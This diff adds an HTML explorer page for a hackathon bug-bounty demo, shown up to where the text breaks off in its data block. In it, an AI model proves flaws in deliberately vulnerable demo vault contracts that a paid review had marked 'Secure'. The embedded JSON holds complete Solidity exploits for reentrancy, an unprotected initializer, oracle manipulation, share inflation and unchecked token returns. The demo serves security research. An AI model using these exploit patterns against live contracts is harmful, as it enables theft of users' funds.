@@ -1,0 +1,425 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>telegraph-bounty explorer</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;700;800&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: an evidence docket. Summary strip, then bounty list (left) + case file (right) that walks the four steps; opinion vs proof is the one loud element. */
+:root{
+  --bg:#eef1f4; --panel:#ffffff; --ink:#14202e; --muted:#5b6878; --line:#d5dbe3;
+  --proof:#0f6e6a; --proof-soft:#dff1ef; --opinion:#9a5b12; --opinion-soft:#f7ebda;
+  --chip:#e6ebf1; --code-bg:#f6f8fa; --focus:#2b5fd9;
+  --f-display:"Archivo","Helvetica Neue",Arial,sans-serif;
+  --f-body:"IBM Plex Sans","Segoe UI",system-ui,sans-serif;
+  --f-mono:"JetBrains Mono",ui-monospace,"SFMono-Regular",Menlo,monospace;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --bg:#10161d; --panel:#18212b; --ink:#e4eaf1; --muted:#93a1b1; --line:#2a3644;
+  --proof:#5cc8bf; --proof-soft:#14302f; --opinion:#e0a55a; --opinion-soft:#33261a;
+  --chip:#222d39; --code-bg:#121a22; --focus:#7aa2ff; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#10161d; --panel:#18212b; --ink:#e4eaf1; --muted:#93a1b1; --line:#2a3644;
+  --proof:#5cc8bf; --proof-soft:#14302f; --opinion:#e0a55a; --opinion-soft:#33261a;
+  --chip:#222d39; --code-bg:#121a22; --focus:#7aa2ff; color-scheme:dark}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--ink);font:15px/1.55 var(--f-body);
+  padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:20px 48px}
+.wrap{max-width:1180px;margin:0 auto;display:flex;flex-direction:column;gap:22px}
+a{color:var(--focus)} a:focus-visible,button:focus-visible{outline:2px solid var(--focus);outline-offset:2px}
+.note{font:500 12.5px/1.4 var(--f-body);color:var(--opinion);background:var(--opinion-soft);border:1px dashed var(--opinion);
+  padding:8px 12px;border-radius:6px}
+header{display:flex;flex-wrap:wrap;align-items:flex-end;justify-content:space-between;gap:14px}
+h1{font:800 clamp(28px,4.4vw,44px)/1.02 var(--f-display);letter-spacing:-.02em;margin:0;text-wrap:balance}
+h1 span{color:var(--proof)}
+.tag{margin:6px 0 0;color:var(--muted);max-width:60ch}
+.runs{display:flex;flex-wrap:wrap;gap:6px}
+.runs button{font:500 13px var(--f-body);color:var(--ink);background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:6px 12px;cursor:pointer}
+.runs button[aria-pressed="true"]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+.strip{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:1px;background:var(--line);border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.stat{background:var(--panel);padding:14px 16px;min-width:0}
+.stat b{display:block;font:700 24px/1.1 var(--f-display);font-variant-numeric:tabular-nums}
+.stat small{color:var(--muted);font-size:12.5px}
+@media (max-width:560px){.stat:last-child:nth-child(odd){grid-column:1/-1}}
+.stat.bad b{color:var(--opinion)} .stat.good b{color:var(--proof)}
+.main{display:grid;grid-template-columns:300px minmax(0,1fr);gap:18px;align-items:start}
+@media (max-width:820px){.main{grid-template-columns:1fr}}
+.list{display:flex;flex-direction:column;gap:8px}
+.lbl{font:600 11.5px var(--f-body);letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.bounty{display:grid;grid-template-columns:1fr auto;gap:2px 10px;text-align:left;width:100%;background:var(--panel);border:1px solid var(--line);
+  border-radius:8px;padding:11px 13px;cursor:pointer;color:var(--ink);font:inherit}
+.bounty[aria-current="true"]{border-color:var(--proof);box-shadow:inset 3px 0 0 var(--proof)}
+.bounty .n{font:700 15px var(--f-display)} .bounty .c{grid-column:1;color:var(--muted);font-size:12.5px}
+.pill{font:600 11.5px var(--f-body);padding:2px 8px;border-radius:999px;align-self:start}
+.pill.paid{background:var(--proof-soft);color:var(--proof)} .pill.wrong{background:var(--opinion-soft);color:var(--opinion)}
+.case{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:20px;display:flex;flex-direction:column;gap:18px;min-width:0}
+.case h2{font:800 26px/1.1 var(--f-display);margin:0}
+.casehead{display:flex;flex-wrap:wrap;justify-content:space-between;gap:10px;align-items:center}
+.replay{font:600 13.5px var(--f-body);background:var(--proof);color:var(--panel);border:0;border-radius:8px;padding:9px 14px;cursor:pointer}
+.vs{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media (max-width:560px){.vs{grid-template-columns:1fr}}
+.vs div{border-radius:10px;padding:14px 16px;min-width:0}
+.vs .op{background:var(--opinion-soft)} .vs .pr{background:var(--proof-soft)}
+.vs .lbl{display:block;margin-bottom:4px}
+.vs .op .lbl{color:var(--opinion)} .vs .pr .lbl{color:var(--proof)}
+.vs strong{font:700 19px/1.25 var(--f-display);display:block}
+.vs p{margin:6px 0 0;font-size:13px;color:var(--muted)}
+ol.steps{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:0}
+.step{display:grid;grid-template-columns:34px minmax(0,1fr);gap:12px;padding:12px 0;border-top:1px solid var(--line);transition:opacity .35s}
+.step.dim{opacity:.28}
+.num{width:28px;height:28px;border-radius:50%;display:grid;place-items:center;font:700 13px var(--f-display);background:var(--chip);color:var(--ink)}
+.step.done .num{background:var(--proof);color:var(--panel)}
+.step h3{margin:3px 0 6px;font:700 15.5px var(--f-display)}
+.kv{display:grid;grid-template-columns:max-content minmax(0,1fr);gap:4px 14px;font-size:13.5px}
+.kv dt{color:var(--muted)} .kv dd{margin:0;min-width:0;overflow-wrap:anywhere}
+.mono{font:12.5px/1.5 var(--f-mono);font-variant-ligatures:none}
+table{width:100%;border-collapse:collapse;font-size:13px}
+.tw{overflow-x:auto}
+th{text-align:left;font:600 11.5px var(--f-body);letter-spacing:.06em;text-transform:uppercase;color:var(--muted);padding:6px 8px;border-bottom:1px solid var(--line)}
+td{padding:7px 8px;border-bottom:1px solid var(--line);vertical-align:top}
+.chip{font:500 11.5px var(--f-body);background:var(--chip);border-radius:4px;padding:1px 6px;white-space:nowrap}
+.ok{color:var(--proof);font-weight:600}
+details summary{cursor:pointer;font-weight:600;font-size:13.5px}
+pre{font-variant-ligatures:none;background:var(--code-bg);border:1px solid var(--line);border-radius:8px;padding:12px;overflow-x:auto;font:12px/1.5 var(--f-mono);margin:8px 0 0}
+.checks{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media (max-width:560px){.checks{grid-template-columns:1fr}}
+.check{border:1px solid var(--line);border-radius:8px;padding:10px 12px;font-size:13.5px}
+.check b{display:block;font:700 14px var(--f-display)}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+@media (max-width:820px){.grid2{grid-template-columns:1fr}}
+.box{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px;min-width:0;display:flex;flex-direction:column;gap:10px}
+.box h2{font:800 19px var(--f-display);margin:0}
+.cmd{display:flex;gap:8px;align-items:stretch}
+.cmd pre{flex:1;margin:0;min-width:0}
+.cmd button{font:600 12px var(--f-body);border:1px solid var(--line);background:var(--chip);color:var(--ink);border-radius:6px;padding:0 10px;cursor:pointer}
+footer{color:var(--muted);font-size:12.5px;max-width:80ch}
+@media (prefers-reduced-motion:reduce){.step{transition:none}}
+</style>
+<style>.note{color:var(--muted);background:var(--panel);border-style:solid;border-color:var(--line)} .pill.none{background:var(--chip);color:var(--muted)} .pill.right{background:var(--proof-soft);color:var(--proof)}</style>
+</head>
+<body>
+<div class="wrap">
+    <header>
+    <div>
+      <h1>telegraph-bounty <span>explorer</span></h1>
+      <p class="tag">A bug bounty paid to the machine that proved the bug. Each case below shows what the paid review said, what the hunter proved, and why the escrow paid.</p>
+    </div>
+    <div>
+      <div class="lbl" id="runs-label">Run</div>
+      <div class="runs" role="group" aria-labelledby="runs-label" id="runs"></div>
+    </div>
+  </header>
+
+  <p class="mock note" id="runnote"></p>
+  <section class="strip" aria-label="Run summary" id="strip"></section>
+
+  <div class="main">
+    <nav class="list" aria-label="Bounties">
+      <div class="lbl" id="listlbl"></div>
+      <div id="list" style="display:flex;flex-direction:column;gap:8px"></div>
+    </nav>
+    <article class="case" id="case" aria-live="polite"></article>
+  </div>
+
+  <div class="grid2">
+    <section class="box">
+      <h2>Deployed on Monad testnet</h2>
+      <p style="margin:0;color:var(--muted);font-size:13.5px">Chain 10143, deployed 2026-11-25. The bytecode on chain matches the build. Live hunts settle on a local chain so anyone can rerun them for free.</p>
+      <div class="tw"><table>
+        <tr><th>Contract</th><th>Address</th></tr>
+        <tr><td>BountyEscrow</td><td class="mono"><a href="https://testnet.monadvision.com/address/0x36dc4b67d1875D7c47ddb6fa29122219DC471Fec" target="_blank" rel="noopener">0x36dc…71Fec</a></td></tr>
+        <tr><td>VulnerableVault <span class="chip">demo target</span></td><td class="mono"><a href="https://testnet.monadvision.com/address/0xb663397b926E49DBA9283EAff0940b37eccfDdfd" target="_blank" rel="noopener">0xb663…FDdfd</a></td></tr>
+        <tr><td>PatchedVault</td><td class="mono"><a href="https://testnet.monadvision.com/address/0x55E0cED018F066a4e928B15893804a90FA68538d" target="_blank" rel="noopener">0x55E0…8538d</a></td></tr>
+      </table></div>
+    </section>
+    <section class="box">
+      <h2>Run a hunt yourself</h2>
+      <p style="margin:0;color:var(--muted);font-size:13.5px">Offline needs no keys. Live mode uses your own testnet wallet and your own Claude login, about $0.15 of test USDC per 5-target hunt.</p>
+      <div class="cmd"><pre id="c1">git clone https://github.com/EmpowerTours/telegraph-bounty
+cd telegraph-bounty && git submodule update --init && npm install
+npm run demo:hunt</pre><button type="button" data-copy="c1">Copy</button></div>
+      <div class="cmd"><pre id="c2">TELEGRAPH_MODE=live npm run demo:hunt</pre><button type="button" data-copy="c2">Copy</button></div>
+    </section>
+  </div>
+
+  <footer>Read-only. Built from the evidence files in <a href="https://github.com/EmpowerTours/telegraph-bounty" target="_blank" rel="noopener">github.com/EmpowerTours/telegraph-bounty</a>. Base Sepolia payments link to the block explorer. Local-chain transactions (bounty, commit, verdict, payout) are deterministic and are rerun by <span class="mono">npm run demo:hunt</span>; they have no public explorer. Telegraph Hackathon Season II, Apps &amp; Agents.</footer>
+</div>
+<script id="data" type="application/json">{"built":"2026-11-26","runs":[{"id":"live-2026-11-26T15-37-34-563Z","kind":"live","label":"Live · 2026-11-26","at":"2026-11-26T15:37:37.232Z","note":"Every purchase settled on Base Sepolia. The review miner (VulnRank) answered “Secure, 0 issues” for all five contracts; the verifier proved a bug in each.","backend":"cli","spend":0.15,"modelCost":0.110092,"modelCalls":5,"solved":5,"withdrawTx":"0x87c80a59e0aad239573e0b956698ab2ea508faccf437878fc9d81b40e2027f16","targets":[{"id":"hook-vault","bounty":"0","cls":"reentrancy","invariant":"each honest user's token balance afterwards is at least what they deposited (3, 3 and 4 ether worth).","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"VulnRank - Security, Compliance and Verified Lookups","tx":"0xd5149f40a73922b557a7d9bf0e6682b5e8997c4771de20e4ae43d6aaadba5f51","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0x3020950b3e0d7487fd2188eed94c7942166908686d8763b96609f47a41fdf2b2","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Telegraph Verity Intelligence","tx":"0x7afc8d6d6c1ffe9ccb96c392206d6af69df41f7a6dbef91bfd89c2957b6bf112","mode":"live"}],"review":{"verdict":"wrong","reviewer":"VulnRank - Security, Compliance and Verified Lookups","defect":false,"label":"“Secure”, 0 issues","summary":"Verdict: Secure (no security issues detected in what was scanned (pattern rules only; not a proof of safety)); launch readiness: ready. 0 security issue(s) found. Not legal advice; 'not detected' means no evidence was found by this scan.","tx":"0xd5149f40a73922b557a7d9bf0e6682b5e8997c4771de20e4ae43d6aaadba5f51"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.030532,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IToken {\n    function wrap() external payable;\n    function approve(address, uint) external returns (bool);\n    function balanceOf(address) external view returns (uint);\n}\n\ninterface IVault {\n    function token() external view returns (address);\n    function deposit(uint) external;\n    function withdraw(uint) external;\n    function transfer(address, uint) external;\n}\n\ncontract Helper {\n    IVault vault;\n    address owner;\n    constructor(address v, address o) { vault = IVault(v); owner = o; }\n    function back(uint amt) external {\n        vault.transfer(owner, amt);\n    }\n}\n\ncontract Exploit {\n    IVault vault;\n    IToken token;\n    Helper helper;\n    bool active;\n\n    constructor(address target) payable {\n        vault = IVault(target);\n        token = IToken(vault.token());\n        helper = new Helper(target, address(this));\n        token.wrap{value: msg.value}();\n        token.approve(target, msg.value);\n        vault.deposit(msg.value);\n    }\n\n    function run() external {\n        uint amt = 1 ether;\n        for (uint i = 0; i \u003c 11; i++) {\n            active = true;\n            vault.withdraw(amt);\n            active = false;\n            helper.back(amt);\n        }\n    }\n\n    function onTokenReceived(address, uint amount) external {\n        if (active && msg.sender == address(token)) {\n            active = false;\n            vault.transfer(address(helper), amount);\n        }\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0xaed999436f275ba28182fad92a26a37bc038ff5436dd7380b93f85092ca3450d","resolveTx":"0xca6be4a733149fe3762ebd70c06870b720ef955df30f0ac44a0a3eee3bc38559"},{"id":"init-vault","bounty":"1","cls":"access-control","invariant":"address(vault).balance >= vault.totalDeposits().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"VulnRank - Security, Compliance and Verified Lookups","tx":"0x6393166ec7cb42235b6bb3ec084d6a61ffc0df997fe289003d4979c88784d837","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0xd407fec6a7c2cf90d78f8f95639c0e225bcd3c19e3162be5a474d40da7cf9ceb","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Telegraph Verity Intelligence","tx":"0x4504118ee4a2e81701ab0f4be615d0d78d694b40aa7d0c1e47fb94cfa74e7e24","mode":"live"}],"review":{"verdict":"wrong","reviewer":"VulnRank - Security, Compliance and Verified Lookups","defect":false,"label":"“Secure”, 0 issues","summary":"Verdict: Secure (no security issues detected in what was scanned (pattern rules only; not a proof of safety)); launch readiness: ready. 0 security issue(s) found. Not legal advice; 'not detected' means no evidence was found by this scan.","tx":"0x6393166ec7cb42235b6bb3ec084d6a61ffc0df997fe289003d4979c88784d837"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.018179999999999998,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IInitVault {\n    function initialize(address owner_, uint256 withdrawLimit_) external;\n    function setPaused(bool paused_) external;\n    function emergencyWithdraw(address payable to) external;\n}\n\ncontract Exploit {\n    IInitVault public vault;\n\n    constructor(address target) payable {\n        vault = IInitVault(target);\n    }\n\n    function run() external {\n        vault.initialize(address(this), 5 ether);\n        vault.setPaused(true);\n        vault.emergencyWithdraw(payable(address(this)));\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x7f423f346a0662be7d302798143fdbd5d0bdc59f049d853f791d4994cb144f1a","resolveTx":"0xf1cf50a19b24e6d18c3b8ecf1ebf6b9d368f103fd2ce763a2b5e243c8d1d8131"},{"id":"lend-pool","bounty":"2","cls":"oracle-manipulation","invariant":"pool.totalCollateral() * 0.001 ether / 1e18 >= pool.totalDebt().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"VulnRank - Security, Compliance and Verified Lookups","tx":"0x3a0ee28d44e6bfa2b5d9b9a0eb71d4361bd45785a8861487d55e4eac7c97adda","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0x3f5e2c521babd042a82bdf9ba2bdb4364460e61148fa0de4014d5028dfaf57fd","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Telegraph Verity Intelligence","tx":"0xebaa6bf2970614aa2d276664ad26bc5264d691562ee37002a669804093e6da48","mode":"live"}],"review":{"verdict":"wrong","reviewer":"VulnRank - Security, Compliance and Verified Lookups","defect":false,"label":"“Secure”, 0 issues","summary":"Verdict: Secure (no security issues detected in what was scanned (pattern rules only; not a proof of safety)); launch readiness: ready. 0 security issue(s) found. Not legal advice; 'not detected' means no evidence was found by this scan.","tx":"0x3a0ee28d44e6bfa2b5d9b9a0eb71d4361bd45785a8861487d55e4eac7c97adda"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.021836,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface ILendPool {\n    function buyGov() external payable;\n    function govOf(address) external view returns (uint);\n    function depositCollateral(uint amount) external;\n    function borrow(uint amount) external;\n}\n\ncontract Exploit {\n    ILendPool pool;\n\n    constructor(address target) payable {\n        pool = ILendPool(target);\n    }\n\n    function run() external {\n        pool.buyGov{value: address(this).balance}();\n        uint g = pool.govOf(address(this));\n        pool.depositCollateral(g);\n        pool.borrow(10 ether);\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x7484944fb610aa8f60ebff536c583d6ce4181b81dd7c31873bdbfcb28dc780f2","resolveTx":"0x375904f04eb9e4293b186f049f2a627dfd2bd8928e8f785caa0a1f3887bef8ad"},{"id":"share-vault","bounty":"3","cls":"share-inflation","invariant":"each of A and B receives at least 99% of the ether they deposited.","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"VulnRank - Security, Compliance and Verified Lookups","tx":"0x7140ddf1a85a8ecb0eda7a4071a6a221ab0c137144aeb2663be0c741afbff74d","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0x2ca212dc5c29bf31db82673fe2f55566651dfa691663499b0496caadc6b931b0","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Telegraph Verity Intelligence","tx":"0x81fd43c84d318ae0ccfdac87a17e2e209cb6e588231e2ce6b11730957b177bc7","mode":"live"}],"review":{"verdict":"wrong","reviewer":"VulnRank - Security, Compliance and Verified Lookups","defect":false,"label":"“Secure”, 0 issues","summary":"Verdict: Secure (no security issues detected in what was scanned (pattern rules only; not a proof of safety)); launch readiness: ready. 0 security issue(s) found. Not legal advice; 'not detected' means no evidence was found by this scan.","tx":"0x7140ddf1a85a8ecb0eda7a4071a6a221ab0c137144aeb2663be0c741afbff74d"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.021584,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IVault {\n    function deposit() external payable returns (uint256);\n}\n\ncontract Donor {\n    constructor(address payable target) payable {\n        selfdestruct(target);\n    }\n}\n\ncontract Exploit {\n    address public target;\n\n    constructor(address _target) payable {\n        target = _target;\n    }\n\n    function run() external {\n        IVault(target).deposit{value: 1}();\n        new Donor{value: address(this).balance}(payable(target));\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x17ef4b22476ff167e65eaa69f6c531fc2b4fbc1f63e2793148505464d203cae6","resolveTx":"0x1626b5647867416ed1243dfa9d6cc12e0e9a236b504940ab4ff463bfc006b910"},{"id":"token-vault","bounty":"4","cls":"unchecked-return","invariant":"token.balanceOf(address(vault)) >= vault.totalDeposits().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":200,"miner":"VulnRank - Security, Compliance and Verified Lookups","tx":"0x6febfc08ed7c6c80758859137a524cf1dea25e5aa0a8982697690c3efb9fbf3b","mode":"live"},{"role":"triage","intent":"VULNERABILITY_TRIAGE_GENERAL","status":200,"miner":"ChainSight — Universal Intelligence & Data Oracle","tx":"0x8a170f5e2706d0fbd21196247ff4c1285e915b3c6829c790b949c1debb826dce","mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":200,"miner":"Telegraph Verity Intelligence","tx":"0xdf434b3389b70dce0938dc28ccdbf79bff7242ea582934b50968d6563d7473c0","mode":"live"}],"review":{"verdict":"wrong","reviewer":"VulnRank - Security, Compliance and Verified Lookups","defect":false,"label":"“Secure”, 0 issues","summary":"Verdict: Secure (no security issues detected in what was scanned (pattern rules only; not a proof of safety)); launch readiness: ready. 0 security issue(s) found. Not legal advice; 'not detected' means no evidence was found by this scan.","tx":"0x6febfc08ed7c6c80758859137a524cf1dea25e5aa0a8982697690c3efb9fbf3b"},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.01796,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IVault {\n    function deposit(uint256 amount) external;\n}\n\ncontract Exploit {\n    address public vault;\n\n    constructor(address target) payable {\n        vault = target;\n    }\n\n    function run() external {\n        // No tokens, no approval: transferFrom returns false, but the vault still credits us.\n        try IVault(vault).deposit(1_000_000 ether) {} catch {}\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x52314c6054e0f85e663782cebb496e3035d12b72b12c17f7f761956f80f540a7","resolveTx":"0x78c2463ff71c15351754276baf6bd1c2a5ea44e972d79682526b44ad4af5b128"}]},{"id":"live-2026-11-25T23-04-33-007Z","kind":"live","label":"Live · 2026-11-25","at":"2026-11-25T23:04:36.628Z","note":"Telegraph’s payment facilitator was failing during this run (402 batch_send_failed: stale_pending_nonce), so no purchase settled and no review reached the model. The hunter solved all five anyway; hook-vault needed a second attempt after a format error.","backend":"cli","spend":0.1,"modelCost":0.14588600000000002,"modelCalls":6,"solved":5,"withdrawTx":"0x623c0c46481325db98b4c11d9045f9ae441982db62c39080b25247cce1d559fe","targets":[{"id":"hook-vault","bounty":"0","cls":"reentrancy","invariant":"each honest user's token balance afterwards is at least what they deposited (3, 3 and 4 ether worth).","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"}],"review":{"verdict":"no_second_opinion","reviewer":null,"defect":null,"label":null,"summary":"no second opinion: the review was answered by the router's last-resort model, not a miner","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.037669999999999995,"valid":false,"reason":"no ```solidity code block in the response"},{"n":2,"model":"claude-sonnet-5-5","cost":0.034132,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IToken {\n    function wrap() external payable;\n    function approve(address, uint) external returns (bool);\n    function balanceOf(address) external view returns (uint);\n}\n\ninterface IVault {\n    function token() external view returns (address);\n    function deposit(uint) external;\n    function withdraw(uint) external;\n    function transfer(address, uint) external;\n    function balanceOf(address) external view returns (uint);\n}\n\ncontract Helper {\n    function drain(IVault v, IToken t) external {\n        uint amt = t.balanceOf(address(v));\n        uint bal = v.balanceOf(address(this));\n        if (amt > bal) amt = bal;\n        v.withdraw(amt);\n    }\n    function onTokenReceived(address, uint) external {}\n}\n\ncontract Exploit {\n    IVault vault;\n    IToken token;\n    Helper helper;\n    bool active;\n\n    constructor(address target) payable {\n        vault = IVault(target);\n        token = IToken(vault.token());\n        helper = new Helper();\n        token.wrap{value: msg.value}();\n        token.approve(target, msg.value);\n        vault.deposit(msg.value);\n    }\n\n    function run() external {\n        active = true;\n        for (uint i = 0; i \u003c 12; i++) {\n            vault.withdraw(1);\n        }\n        active = false;\n        helper.drain(vault, token);\n    }\n\n    function onTokenReceived(address, uint) external {\n        if (active && msg.sender == address(token)) {\n            uint b = vault.balanceOf(address(this));\n            if (b > 0) vault.transfer(address(helper), b);\n        }\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x18d9b89395dbd9cc2193cecd6b082c5365ed6494a31ee5dc2338348128a33738","resolveTx":"0xa4b2dee581fa8013853d63c44832f45babe13e1775c14757552c7d4ae726561f"},{"id":"init-vault","bounty":"1","cls":"access-control","invariant":"address(vault).balance >= vault.totalDeposits().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"}],"review":{"verdict":"no_second_opinion","reviewer":null,"defect":null,"label":null,"summary":"no second opinion: the review was answered by the router's last-resort model, not a miner","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.016346,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"pragma solidity 0.8.28;\n\ninterface IVault {\n    function initialize(address owner_, uint256 withdrawLimit_) external;\n    function setPaused(bool p) external;\n    function emergencyWithdraw(address payable to) external;\n}\n\ncontract Exploit {\n    address public vault;\n\n    constructor(address target) payable {\n        vault = target;\n    }\n\n    function run() external {\n        IVault v = IVault(vault);\n        v.initialize(address(this), type(uint256).max);\n        v.setPaused(true);\n        v.emergencyWithdraw(payable(address(this)));\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0xfcf9b7a894c93e897c3d9793e6ab470b985afec57af822b9a16684584a5306db","resolveTx":"0x21c46771694fde9a5eb35f499ccf44fcde1f16715424f34761eee3d3b11058a7"},{"id":"lend-pool","bounty":"2","cls":"oracle-manipulation","invariant":"pool.totalCollateral() * 0.001 ether / 1e18 >= pool.totalDebt().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"}],"review":{"verdict":"no_second_opinion","reviewer":null,"defect":null,"label":null,"summary":"no second opinion: the review was answered by the router's last-resort model, not a miner","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.022262,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface ILendPool {\n    function buyGov() external payable;\n    function depositCollateral(uint amount) external;\n    function borrow(uint amount) external;\n    function govOf(address) external view returns (uint);\n}\n\ncontract Exploit {\n    ILendPool public pool;\n\n    constructor(address target) payable {\n        pool = ILendPool(target);\n    }\n\n    function run() external {\n        pool.buyGov{value: 10 ether}();\n        pool.depositCollateral(pool.govOf(address(this)));\n        pool.borrow(10 ether);\n    }\n\n    receive() external payable {}\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0xdb1defd8fd828bdfb7dba381b12802425a9c2bad20a2826d8d06234f38ec6f9b","resolveTx":"0x35ef9f87f02849a349cc51649ee7544d3c3e63115dc73aef7e73c6766aa7aeb7"},{"id":"share-vault","bounty":"3","cls":"share-inflation","invariant":"each of A and B receives at least 99% of the ether they deposited.","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"}],"review":{"verdict":"no_second_opinion","reviewer":null,"defect":null,"label":null,"summary":"no second opinion: the review was answered by the router's last-resort model, not a miner","tx":null},"attempts":[{"n":1,"model":"claude-sonnet-5-5","cost":0.0184,"valid":true,"reason":"breaks invariant on vulnerable, holds on patched"}],"sol":"// SPDX-License-Identifier: MIT\npragma solidity 0.8.28;\n\ninterface IVault {\n    function deposit() external payable returns (uint256);\n}\n\ncontract Burner {\n    constructor(address payable to) payable {\n        selfdestruct(to);\n    }\n}\n\ncontract Exploit {\n    address public target;\n\n    constructor(address _target) payable {\n        target = _target;\n    }\n\n    function run() external {\n        IVault(target).deposit{value: 1}();\n        new Burner{value: address(this).balance}(payable(target));\n    }\n}\n","solved":true,"reason":"breaks invariant on vulnerable, holds on patched","commitTx":"0x3861f098688b5ba0b2165a4503532527c49c2f1cf2aca8b9953c6d633d5e29c2","resolveTx":"0x1d1d8489f6e9ea4b5be9f1fc5f383214aa9ddc31d9fbe9c25a24469ffd00d863"},{"id":"token-vault","bounty":"4","cls":"unchecked-return","invariant":"token.balanceOf(address(vault)) >= vault.totalDeposits().","purchases":[{"role":"review","intent":"SECURITY_REVIEW_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"},{"role":"patch_verify","intent":"CODE_PATCH_VERIFY_GENERAL","status":402,"miner":null,"tx":null,"mode":"live"}],"review":{"verdict":"no_second_opinion","reviewer":null,"defect":null,"label":null,"summary":"no 